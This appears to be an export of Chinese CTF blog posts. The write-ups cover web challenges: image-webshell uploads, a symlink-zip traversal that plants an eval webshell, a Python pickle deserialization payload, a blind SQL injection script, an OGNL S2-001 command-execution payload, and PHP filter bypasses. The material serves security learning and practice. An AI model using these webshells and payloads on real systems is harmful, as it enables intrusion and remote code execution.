$fileName=urldecode($_FILES[&#x27;postedFile&#x27;][&#x27;name&#x27;]);//对文件名进行解码    if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123;        die(&quot;有些东西让你传上去的话那可不得了&quot;);    &#125;    $imagePath = &quot;image/&quot; . mb_strtolower($fileName);    if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123;        echo &quot;upload success, image at $imagePath&quot;;    &#125; else &#123;        die(&quot;传都没有传上去&quot;);    &#125;&#125;\n\n这个代码中做的最主要的过滤就是\n$fileName=urldecode($_FILES[&#x27;postedFile&#x27;][&#x27;name&#x27;]);if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123;    die(&quot;有些东西让你传上去的话那可不得了&quot;);&#125;\n\n对我们文件名进行过滤，然后stristr会忽略大小写，虽然后面代码中会通过mb_strtolower将文件名变为小写，但是在手册中还查到这个规定\n\n\n也就是说mb_strtolower能转化为小写的不止规定的字母，可以是任意具有字母属性的字符，虽然我不知道php代码是怎么写的\n然后我们扫目录发现还有一个example.php文件，访问得到\n&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) &#123;    $zip = new \\ZipArchive(); //获取到zip类    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123; //我们上传的文件后缀必须为zip        die(&quot;要不咱们再看看？&quot;);    &#125;    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;  //进行解压        die (&quot;都不能解压呢&quot;);    &#125;    echo &quot;可以解压，我想想存哪里&quot;;    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);    $zip-&gt;extractTo($pos_for_zip);//进行解压到执行目录    $zip-&gt;close();    unlink($name_for_zip);//删除zip文件    $files = glob(&quot;$pos_for_zip/*&quot;);//通过glob找到解压出来的文件    foreach($files as $file)&#123;        if (is_dir($file)) &#123;            continue;//如果是一个目录则终止        &#125;        $first = imagecreatefrompng($file);//将文件转化为图像        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [&#x27;x&#x27; =&gt; 0, &#x27;y&#x27; =&gt; 0, &#x27;width&#x27; =&gt; $size, &#x27;height&#x27; =&gt; $size]);//将我们的图像使用正方形裁剪，也就是我们上传的文件要保持完整需要保持宽度和长度一致        if ($second !== FALSE) &#123;            $final_name = pathinfo($file)[&quot;basename&quot;];            imagepng($second, &#x27;example/&#x27;.$final_name);//以png格式将图片输出到文件中，也就是说文件名我们是可以控制的，只需要不被破坏文件内容及可            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);//最后会删除文件    &#125;&#125;\n\n结合两个文件，一个是进行文件上传，一个是可以对执行路径的zip文件进行解压，然后主要漏洞点在于最后保存的文件名是可控的\n也就是说我们需要先构造一个图片马，然后将后缀改为php，然后压缩为zip上传后被解压后仍是php文件\n我们先使用工具构造一个png图片马，避免报错PNG-IDAT-Payload-Generator\npython generate.py -m php -p  -o webshell.png\n\n然后进行压缩\n这个题目有点特殊如果是默认请求下生成的webshell为\n&lt;?=$_GET[0]($_POST[1])?&gt;\n\n由于eval不是函数导致我们0是不能传递eval进行执行的，也就是无法连接蚁剑，但是可以执行system，但是这个题目的flag藏的很深导致我们如果通过执行命令就会特别麻烦，于是需要改默认的payload\n在generate中找到\n\n\n然后复制16进制到010editor中修改shell\n\n\n需要注意必须修改为大写的EVAL，小写加密时会报错\n\n\n然后再进行加密\n\n\n将源码中的shell和16进制进行替换\n\n\n然后将得到的图片马后缀改为php然后进行压缩\n\n\n但是在上传文件的时候过滤掉了\n    $imageinfo = getimagesize($_FILES[&#x27;postedFile&#x27;][&#x27;tmp_name&#x27;]);//从我们上传的数据中提取图片信息    if ($imageinfo === FALSE) &#123;        die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;);    &#125;if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;))    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1)\n\nzip的i被过滤掉了，而且还规定我们图片的宽度和长度都必须为1，而且还在前面使用getimagesize进行检验图片\n这个时候不知道为什么在文件内容中添加\n#define width 1 #define height 1\n\n可以在改写图片宽高的同时绕过getimagesize检验\n然后就是zip中的i进行绕过了，利用的是mb_strtolower可以将非英文字母的字符也转化为小写，就像日文和中文，虽然语言不一样，但是日文中的大多数汉字在计算机上和中文是一样的，我们可以利用其他字符转小写后等于i，但是这个方法受php版本的影响，所以很苛刻\n&lt;?phpvar_dump(mb_strtolower(&#x27;İ&#x27;)===&#x27;i&#x27;);echo urlencode(&#x27;İ&#x27;);?&gt;//true   %C4%B0\n\n\n\n然后就是进行文件上传，记得修改上传文件的name为postedFile\n\n\n上传完压缩包后去example.php中进行解压，由于没有进行路径过滤，我们通过目录穿越访问到image目录下的zip文件\n\n\n成功进行解压，根据代码，我们的文件被存放到example目录下，访问example/ma.php\n\n\n直接使用蚁剑进行连接，最后在这个路径下拿到flag\n\n\n\n\n这个题目主要考的是图片马和mb_strtolower函数的特性，和通过在文件数据中添加#define height weith实现绕过getimagesize图片检测\n","tags":["getimagesize","#define width 1"]},{"title":"[CISCN2019_华北赛区_Day1_Web2]ikun","url":"/2025/10/13/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun/","content":"[CISCN2019_华北赛区_Day1_Web2]ikun没想到都到国赛了，都会有小黑子，这题目鸡脚太明显了\n题目是一个ikun的商店，然后我们注册登录之后提示我们一定要买到lv6的账号，我尝试多翻几页，但是没有找到，然后就是传入了一个page参数，看来需要我们爆破页数来找到lv6账号\n\n\n我们发现在前端界面中图片的后缀对应等级lv6.png\nimport requestsurl=&#x27;http://d62067ab-33d4-428c-98ca-5afcf04aa4ce.node5.buuoj.cn:81/shop&#x27;for i in range(1,1000):    print(i)    response=requests.get(url,params=&#123;&#x27;page&#x27;:i&#125;)    if &#x27;lv6.png&#x27; in response.text:        print(response.text)        break\n\n跑出来发现是181页，访问发现价格有点高买不下来\n\n\n但是我们加入购物车后发现，可以使用折扣卷，然后我们抓包发现价格和折扣都是直接通过POST参数传递，发现改折扣可以实现302跳转\n\n\n访问到发现需要我们是admin，在Cookie中拿到jwt发现是jwt数据，然后我们直接爆破密匙发现\n\n\n我们通过密匙改Cookie为admin（需要抓包改），查看页面源码发现www.zip\n\n\n下载下来在Admin.py中有反序列化函数\n\n\n然后根据代码中的引入包的特征发现这是Python2的语法，然后就是没有任何过滤的反序列化，直接构造即可，然后在Python2的环境下运行\nimport pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print(a)\n\n得到\nc__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.\n\n我们将其放入becom参数中传递\n\n","tags":["jwt爆破","requests"]},{"title":"CTFSHOW_Uzip","url":"/2025/09/15/CTFSHOW-Uzip/","content":"CISCN Uzip这个题目是一个文件上传，但是和我感觉的传统意义的文件上传不一样。\n我们先随便上传一个文件回显\n&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo = finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;    exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);&#125;;\n\n我之前写的一个题目，也是考这个，但是那个题目没有任何回显导致我就没想到软链接\n我们可以看到这个代码实现了将我们上传的zip文件放入tmp目录下然后进行解压\n我之前对于软连接的认识还停留在可以通过软链接实现文件读取的地步，没想到还可以实现解压文件实现目录穿越，将解压文件送至网站根目录\n我们先创建一个指向根目录的软链接然后进行压缩为zip\nln -s /var/www/html testzip --symlinks link.zip test\n\n上传完之后在tmp目录下就会有一个软链接指向根目录\n然后我们再创建含webshell的zip文件\n#先在test文件夹中创建一个shell.php&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;#然后再对test文件夹进行压缩zip -r test.zip test\n\n我们再将这个test.zip上传，解压后就会出现\n/tmp/test/shell.php\n\n然后由于我们之前上传了一个软链接，于是/tmp/test便会解析为\n/var/www/html/shell.php\n\n\n\n上传完文件之后即可访问\n\n\n直接读取flag\n\n","tags":["软链接","目录穿越","Webshell"]},{"title":"CTFSHOW_萌新记忆","url":"/2025/09/08/CTFSHOW-%E8%90%8C%E6%96%B0%E8%AE%B0%E5%BF%86/","content":"CTFSHOW_萌新记忆不愧是萌新记忆，突然就想起刚开始学sql注入的时候了，这个题目我感觉还是有点难度而且我思路也不是特别好\n我们扫描目录发现有/admin/目录访问发现一个登录框，尝试进行sql注入发现过滤了注释符和or和and，不得不说光过滤or已经可以让我喝一壶了，我还要去找东西替代information，这次过滤1了注释符也是一个需要注意的地方，喝盲注的思路有关\nu=admin&amp;p=1  #返回 密码错误u=1&amp;p=1 #返回 用户名/密码错误\n\n很明显我们可以通过u这个参数进行盲注\nu=&#x27;|| substr(p,1,1)&lt;&#x27;a#先通过||代替or#这里由于两边都是字符串而且等号喝大于符号都没了使用字符进行盲注#然后就是直接猜列名就是p 至于为什么不用管表名这是因为没使用注释符后面的from语句还可以用\n\n然后直接进行盲注，注意sql字符串进行比较和php一样只会比较第一个字符，所以我们的字符集需要ascii从小到大\nimport requestsflag=&#x27;&#x27;letter=&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;#爆破的是密码不是flag，可以不用括号for i in range(1, 20):    for j in letter:        ulr=&#x27;http://328f8881-39c3-47e9-ba30-3415e9bbe15e.challenge.ctf.show/admin/checklogin.php&#x27;        data=&#123;            &#x27;u&#x27;:&quot;&#x27;||substr(p,&#123;&#125;,1)&lt;&#x27;&#123;&#125;&quot;.format(i,j),&quot;p&quot;:1        &#125;        res=requests.post(ulr,data=data)        print(res.text)        if(&#x27;密码错误&#x27;==res.text):            flag+= chr(ord(j)-1) #将asecii-1然后转回字符            print(flag)            break\n\n之前都是用二分法进行盲注的，但是我感觉还不如直接遍历注入\n"},{"title":"CTFSHOW_JAVA","url":"/2025/10/22/CTFSHOW-JAVA/","content":"CTFSHOW_JAVA感觉这些题目怎么全都是CVE漏洞啊，如果一个要我去推一遍不是玩完了吗，Java好难\nweb279题目是一个输入框然后提示我们是S2-001漏洞，看了一下大佬的漏洞分析\n我们可以先往输入框中输入%&#123;1+6&#125;，如果输入框中返回的值为7则代表表达式被OGNL解析了\n\n\n漏洞成因是解析OGNL表达式的时候，本来只需要解析%&#123;username&#125;通过上下文获取表单输入，却因为循环，如果提取到的表单中也有%&#123;&#125;就会继续解析OGNL表达式，导致我们可以直接执行OGNL表达式进行命令执行，然后通过其输出流将其写入Struts的HTTP响应对象中\n%&#123;  #a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;env&quot;&#125;)).redirectErrorStream(true).start(),  #b=#a.getInputStream(),  #c=new java.io.InputStreamReader(#b),  #d=new java.io.BufferedReader(#c),  #e=new char[50000],  #d.read(#e),  #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),  #f.getWriter().println(new java.lang.String(#e)),  #f.getWriter().flush(),  #f.getWriter().close()&#125;\n\n成功拿到flag\n\n"},{"title":"Class文件结构","url":"/2025/11/27/Class%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/","content":""},{"title":"CTFshow大赛原题1","url":"/2025/10/08/CTFshow%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%981/","content":"CTFshow大赛原题1web680题目进去直接给提示\n\n\n题目是我们POST传入代码执行，尝试了一下发现是PHP，于是直接phpinfo()\n\n\nphp版本是5.6，但是查看disable_function发现命令执行函数被全部禁了，一开始发现输出函数都有，就想着使用反引号进行命令执行(php中等于shell_exec)，于是shell_exec被禁了就无法了\n然后尝试蚁剑的disable_function插件发现都用不了\n看了题解发现使用highligth_file可以读取文件，读取了index.php发现是一个没有过滤的webshell，于是这个时候我们只需要知道flag的存放位置即可，尝试了常规的一些文件发现好像无法访问根目录，可能是限制了。\n然后使用scandir()函数，可以将路径下的目录以数组的形式返回，访问当前目录发现flag\n\n\n直接读取即可\n\n\n\n\nweb681这个题目就是一个输入框，无论输入什么都是返回同样的界面\n\n\n然后抓包发现是sql注入漏洞\n\n\n但是有一个没遇到过的问题就是他把单引号给过滤了导致我无法闭合，我就卡在这里了\n看了题解之后才发现这么容易，由于没有过滤转义符号，我们可以通过将后面的引号进行转义，然后注释符就有效了，可以直接注释后面的语句\n我们直接输入\n||1#\\\n\n然后语句就成了\n\n\n但是这样前面的单引号就无法匹配，然后我尝试了一下，不知道为什么可以使用\nSELECT count(*) FROM ctfshow_users WHERE username = &#x27;||1#\\&#x27; OR nickname = &#x27;||1#\\&#x27;\n\n我们发现第一个引号和第二个参数多出来的那个引号拼接起来了，导致后面那个参数的注释符生效了，可以直接万能密码，我们在输入框中输入||1#\\即可获得flag\n\n\n\n\n\n\nweb682不会解混淆，寄了\nweb683 &lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-09-24 17:34:28# @Last Modified by:   h1xa# @Last Modified time: 2021-09-24 20:32:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/   error_reporting(0);   include &quot;flag.php&quot;;   if(isset($_GET[&#x27;秀&#x27;]))&#123;       if(!is_numeric($_GET[&#x27;秀&#x27;]))&#123;          die(&#x27;必须是数字&#x27;);       &#125;else if($_GET[&#x27;秀&#x27;] &lt; 60 * 60 * 24 * 30 * 2)&#123;  //5,184,000          die(&#x27;你太短了&#x27;);       &#125;else if($_GET[&#x27;秀&#x27;] &gt; 60 * 60 * 24 * 30 * 3)&#123; //7,776,000           die(&#x27;你太长了&#x27;);       &#125;else&#123;           sleep((int)$_GET[&#x27;秀&#x27;]);           echo $flag;       &#125;       echo &#x27;&lt;hr&gt;&#x27;;   &#125;   highlight_file(__FILE__); \n\n这个题目绕过挺容易的就是在后面的sleep代码，如果我们正常数据的话需要跑几天去了，但是我们发现在进行sleep之前进行了int类型的强制类型转换\n我们都知道php从请求头中获取到的参数是字符串，然后进行比较的时候会对我们传入的数据进行类型转换为数字，于是我们可以尝试科学计数法和进制绕过\n因为在进行int强制类型转换的时候不会考虑科学计数法和进制，但是科学计数法应该是在php7以上的版本就会考虑了，但是这道题目还是可以用的，机制转换只要前面是0，就会返回0\n\n\npayload\n?秀=0x5b8d80?秀=6e6\n\n6e6的话就需要加载6秒\n\n\n\n\nweb684 &lt;?php$action = $_GET[&#x27;action&#x27;] ?? &#x27;&#x27;;$arg = $_GET[&#x27;arg&#x27;] ?? &#x27;&#x27;;if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;, $action)) &#123;    show_source(__FILE__);&#125; else &#123;    $action(&#x27;&#x27;, $arg);&#125; \n\n看见这个正则使用了^$匹配行头和行尾而且没有m修饰符，就知道用换行符就可以绕过正则匹配，然后就是我们函数执行中的参数是两个，其中一个我们可以控制\n也就是说我们需要找到一个可以进行命令执行，然后还有两个参数的函数，根据正则过滤来推断出是creat_function，其特性就是可以将第二个参数作为代码进行执行，然后第一个参数为空即可\n?action=%0acreat_function&amp;arg=system(ls);\n\n\n\n\n\n\n\n\n\n\n\n","tags":["highlight_file","\\闭合sql语句","类型转换绕过","回车绕过单行正则匹配"]},{"title":"[DDCTF_2019]homebrew_event_loop","url":"/2025/05/23/DDCTF-2019-homebrew-event-loop/","content":"[DDCTF_2019]homebrew_event_loop妈的，最近怎么全是flask的题目，python代码基本看不懂，还一下子来这么多题目。这个题目还没写出来就来写笔记，目的就是代码审计\n我们进入靶场之后直接下载源代码，其他看了也没用\nfrom flask import Flask, session, request, Responseimport urllibapp = Flask(__name__)app.secret_key = &#x27;*********************&#x27;  # censoredurl_prefix = &#x27;/d5afe1f66147e857&#x27;def FLAG():    return &#x27;*********************&#x27;  # censoreddef trigger_event(event):    session[&#x27;log&#x27;].append(event)    if len(session[&#x27;log&#x27;]) &gt; 5:        session[&#x27;log&#x27;] = session[&#x27;log&#x27;][-5:]    if type(event) == type([]):        request.event_queue += event    else:        request.event_queue.append(event)def get_mid_str(haystack, prefix, postfix=None):    haystack = haystack[haystack.find(prefix)+len(prefix):]    if postfix is not None:        haystack = haystack[:haystack.find(postfix)]    return haystackclass RollBackException:    passdef execute_event_loop():    valid_event_chars = set(        &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;)    resp = None    while len(request.event_queue) &gt; 0:        # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;        event = request.event_queue[0]        request.event_queue = request.event_queue[1:]        if not event.startswith((&#x27;action:&#x27;, &#x27;func:&#x27;)):            continue        for c in event:            if c not in valid_event_chars:                break        else:            is_action = event[0] == &#x27;a&#x27;            action = get_mid_str(event, &#x27;:&#x27;, &#x27;;&#x27;)            args = get_mid_str(event, action+&#x27;;&#x27;).split(&#x27;#&#x27;)            try:                event_handler = eval(                    action + (&#x27;_handler&#x27; if is_action else &#x27;_function&#x27;))                ret_val = event_handler(args)            except RollBackException:                if resp is None:                    resp = &#x27;&#x27;                resp += &#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;                resp += &#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;                session[&#x27;num_items&#x27;] = request.prev_session[&#x27;num_items&#x27;]                session[&#x27;points&#x27;] = request.prev_session[&#x27;points&#x27;]                break            except Exception, e:                if resp is None:                    resp = &#x27;&#x27;                # resp += str(e) # only for debugging                continue            if ret_val is not None:                if resp is None:                    resp = ret_val                else:                    resp += ret_val    if resp is None or resp == &#x27;&#x27;:        resp = (&#x27;404 NOT FOUND&#x27;, 404)    session.modified = True    return resp@app.route(url_prefix+&#x27;/&#x27;)def entry_point():    querystring = urllib.unquote(request.query_string)    request.event_queue = []    if querystring == &#x27;&#x27; or (not querystring.startswith(&#x27;action:&#x27;)) or len(querystring) &gt; 100:        querystring = &#x27;action:index;False#False&#x27;    if &#x27;num_items&#x27; not in session:        session[&#x27;num_items&#x27;] = 0        session[&#x27;points&#x27;] = 3        session[&#x27;log&#x27;] = []    request.prev_session = dict(session)    trigger_event(querystring)    return execute_event_loop()# handlers/functions below --------------------------------------def view_handler(args):    page = args[0]    html = &#x27;&#x27;    html += &#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;.format(        session[&#x27;num_items&#x27;], session[&#x27;points&#x27;])    if page == &#x27;index&#x27;:        html += &#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;        html += &#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;        html += &#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;    elif page == &#x27;shop&#x27;:        html += &#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;    elif page == &#x27;reset&#x27;:        del session[&#x27;num_items&#x27;]        html += &#x27;Session reset.&lt;br /&gt;&#x27;    html += &#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;    return htmldef index_handler(args):    bool_show_source = str(args[0])    bool_download_source = str(args[1])    if bool_show_source == &#x27;True&#x27;:        source = open(&#x27;eventLoop.py&#x27;, &#x27;r&#x27;)        html = &#x27;&#x27;        if bool_download_source != &#x27;True&#x27;:            html += &#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;            html += &#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;        for line in source:            if bool_download_source != &#x27;True&#x27;:                html += line.replace(&#x27;&amp;&#x27;, &#x27;&amp;amp;&#x27;).replace(&#x27;\\t&#x27;, &#x27;&amp;nbsp;&#x27;*4).replace(                    &#x27; &#x27;, &#x27;&amp;nbsp;&#x27;).replace(&#x27;&lt;&#x27;, &#x27;&amp;lt;&#x27;).replace(&#x27;&gt;&#x27;, &#x27;&amp;gt;&#x27;).replace(&#x27;\\n&#x27;, &#x27;&lt;br /&gt;&#x27;)            else:                html += line        source.close()        if bool_download_source == &#x27;True&#x27;:            headers = &#123;&#125;            headers[&#x27;Content-Type&#x27;] = &#x27;text/plain&#x27;            headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=serve.py&#x27;            return Response(html, headers=headers)        else:            return html    else:        trigger_event(&#x27;action:view;index&#x27;)def buy_handler(args):    num_items = int(args[0])    if num_items &lt;= 0:        return &#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;.format(args[0])    session[&#x27;num_items&#x27;] += num_items    trigger_event([&#x27;func:consume_point;&#123;&#125;&#x27;.format(        num_items), &#x27;action:view;index&#x27;])def consume_point_function(args):    point_to_consume = int(args[0])    if session[&#x27;points&#x27;] &lt; point_to_consume:        raise RollBackException()    session[&#x27;points&#x27;] -= point_to_consumedef show_flag_function(args):    flag = args[0]    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.    return &#x27;You naughty boy! ;) &lt;br /&gt;&#x27;def get_flag_handler(args):    if session[&#x27;num_items&#x27;] &gt;= 5:        # show_flag_function has been disabled, no worries        trigger_event(&#x27;func:show_flag;&#x27; + FLAG())    trigger_event(&#x27;action:view;index&#x27;)if __name__ == &#x27;__main__&#x27;:    app.run(debug=False, host=&#x27;0.0.0.0&#x27;)\n\n这么多代码，如果让我来全部审计的化还是杀了我吧，我们直接从含有flag的函数开始看\ndef get_flag_handler(args):    if session[&#x27;num_items&#x27;] &gt;= 5:        # show_flag_function has been disabled, no worries        trigger_event(&#x27;func:show_flag;&#x27; + FLAG())    trigger_event(&#x27;action:view;index&#x27;)\n\n如果session[&#39;num_items&#39;]大于等于5就会触发trigger_event函数，我们直接去看\ndef trigger_event(event):    session[&#x27;log&#x27;].append(event)    if len(session[&#x27;log&#x27;]) &gt; 5:        session[&#x27;log&#x27;] = session[&#x27;log&#x27;][-5:]#python列表中，最后一个元素下标为-1 所以这是取最后5个元素    if type(event) == type([]):        request.event_queue += event    else:        request.event_queue.append(event)\n\n这个代码将传入的event参数写入session中的log列表(flask中session用json储存)\nsession[&#39;log&#39;] = session[&#39;log&#39;][-5:]这个对log列表进行切片操作，保留从后面开始的5个元素\n然后如果event的类型为列表，则\n\n如果是列表：request.event_queue += event 将列表元素合并到事件队列\n如果是单个事件：request.event_queue.append(event) 追加到队列\n\n到这里就断掉了，不知道怎么办，看题解说先满足session[&#39;numitem&#39;]大于等于5\ndef buy_handler(args):    num_items = int(args[0])    if num_items &lt;= 0:        return &#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;.format(args[0])    session[&#x27;num_items&#x27;] += num_items    trigger_event([&#x27;func:consume_point;&#123;&#125;&#x27;.format(        num_items), &#x27;action:view;index&#x27;])def consume_point_function(args):    point_to_consume = int(args[0])    if session[&#x27;points&#x27;] &lt; point_to_consume:        raise RollBackException()    session[&#x27;points&#x27;] -= point_to_consume\n\n\n\n看了半天，结果连怎么拿到flag都不知道，果然以后的题目要从路由开始看\n\n\n\n\n\n\n\n\n妈的太难了，直接放弃"},{"title":"[Dest0g3_520迎新赛]SimpleRCE","url":"/2025/07/09/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-SimpleRCE/","content":"[Dest0g3_520迎新赛]SimpleRCE &lt;?phphighlight_file(__FILE__);$aaa=$_POST[&#x27;aaa&#x27;];$black_list=array(&#x27;^&#x27;,&#x27;.&#x27;,&#x27;`&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;=&#x27;,&#x27;&quot;&#x27;,&#x27;preg&#x27;,&#x27;&amp;&#x27;,&#x27;|&#x27;,&#x27;%0&#x27;,&#x27;popen&#x27;,&#x27;char&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;&#123;&#x27;,&#x27;&#125;&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;file&#x27;,&#x27;ascii&#x27;,&#x27;eval&#x27;,&#x27;replace&#x27;,&#x27;assert&#x27;,&#x27;exec&#x27;,&#x27;$&#x27;,&#x27;include&#x27;,&#x27;var&#x27;,&#x27;pastre&#x27;,&#x27;print&#x27;,&#x27;tail&#x27;,&#x27;sed&#x27;,&#x27;pcre&#x27;,&#x27;flag&#x27;,&#x27;scan&#x27;,&#x27;decode&#x27;,&#x27;system&#x27;,&#x27;func&#x27;,&#x27;diff&#x27;,&#x27;ini_&#x27;,&#x27;passthru&#x27;,&#x27;pcntl&#x27;,&#x27;proc_open&#x27;,&#x27;+&#x27;,&#x27;cat&#x27;,&#x27;tac&#x27;,&#x27;more&#x27;,&#x27;sort&#x27;,&#x27;log&#x27;,&#x27;current&#x27;,&#x27;\\\\&#x27;,&#x27;cut&#x27;,&#x27;bash&#x27;,&#x27;nl&#x27;,&#x27;wget&#x27;,&#x27;vi&#x27;,&#x27;grep&#x27;);$aaa = str_ireplace($black_list,&quot;hacker&quot;,$aaa);eval($aaa);?&gt; \n\n没想到新生赛都会寄掉了，这个熟悉的过滤和eval，我应该直接想到用异或和取反进行绕过的，但是这个题目有好几种方法\n取反绕过\n这个题目的取反符没有被过滤，我们可以直接取反绕过，但是遇到了之前我们的一些疑惑\n我们直接构造取反语句\necho urlencode(~&#x27;system&#x27;);\n\n即可拿到system取反后的url编码，我们需要知道的是取反符后面必须接字符串，我们的payload长这样\n(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98)//本来这么写语法是错的，但是应该是url解码后自动认定为字符串了(~&#x27;%8C%86%8C%8B%9A%92&#x27;)(~&#x27;%9C%9E%8B%DF%D0%99%93%9E%98&#x27;);//编码取反分别为 system   cat /flag\n\n\n\n重点在于我们的payload加载结束后应该是\n(&#x27;system&#x27;)(&#x27;cat /flag&#x27;)//这种命令执行的格式是我以前没见过的\n\n这个我去问了一下发现是php动态函数调用\n在 PHP 中，动态函数调用（Dynamic Function Calls） 是一种允许通过 变量、字符串或表达式 来调用函数的技术。这种方式提供了灵活性，但也可能带来安全风险（如代码注入）。以下是详细解析：\nfunction sayHello() &#123;    echo &quot;Hello!&quot;;&#125;$funcName = &#x27;sayHello&#x27;;$funcName();  // 输出: Hello!\n\n也就是说字符串后面直接接个括号就能调用函数\n我尝试使用哪个代码去执行命令\n\n\n发现这种形式真的可以调用函数，学到了。\napache_request_headers\n这个题目虽然禁掉了很多函数，正常命令执行不能用了，想使用getallheaders进行请求头注入又发现get被过滤了，但是看了题解发现又有一个没被过滤的函数可以使用\n但是这个题目用的是openresty，一个基于 Nginx 和 LuaJIT 的高性能 Web 平台\nbuu和比赛平台不一致于是就不能复现，但是可以抄一下payload\napache_request_headers() 是 PHP 中用于获取当前 HTTP 请求所有头信息的函数，类似于 getallheaders()，但这是它的正式名称\nArray(    [Host] =&gt; example.com    [User-Agent] =&gt; Mozilla/5.0    [Accept] =&gt; text/html,application/xhtml+xml    [Accept-Language] =&gt; en-US,en    [Accept-Encoding] =&gt; gzip, deflate    [Connection] =&gt; keep-alive    [Authorization] =&gt; Bearer abc123...)\n\npayload\nPOST：aaa=show_source(next(apache_request_headers()));User-Agent: /flag\n\n\n\n内置类\n由于没有过滤show_source，所以我们只需要在flag被过滤的情况下返回flag就行了\npayload\nnew DirectoryIterator(&#x27;glob:///f*&#x27;)\n\n通过DirectoryIterator内置类配合glob协议返回字符串’flag’\n\n\n但是不知道为什么，前面那个路径符一直拼接不了\n\n\n但是我在我自己电脑上可以运行\n\n\n算了，这个太玄乎了\n"},{"title":"[Dest0g3_520迎新赛]EasySSTI","url":"/2025/06/10/Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-EasySSTI/","content":"[Dest0g3_520迎新赛]EasySSTI题目是一个登录框，注入点就是username，感觉很像新生赛的题目。一切的开始在于无法直接使用fenjing，但是写完后发现不知道这是哪里的新生赛这么难。\n打算直接用payload过的时候发现不仅过滤了request等用于绕过的关键字，还过滤掉了引号，中括号，下划线等，导致无法使用编码绕过，结果我学过的绕过方法一个都用不上\n由于引号和中括号和点号被过滤了，无法进行编码绕过。我们可以使用attr()对点号和中括号进行过滤，但是题目又把requests进行了过滤，导致request.args进行下划线绕过，所学知识全部废了\n首先我们来看下这个代码\n&#123;% set gl=dict(glo=a,bals=a)|join%&#125;# set定义一个变量#dict创建一个字典#join过滤器将字典中的字符串拼接起来返回拼接的字符串#于是最后的结果就是 gl=globals 实现了关键词绕过\n\n于是现在我们的关键词的问题解决了，但是下划线过滤还在\npop 是 Python&#x2F;Jinja2 中的一个内置方法，主要用于 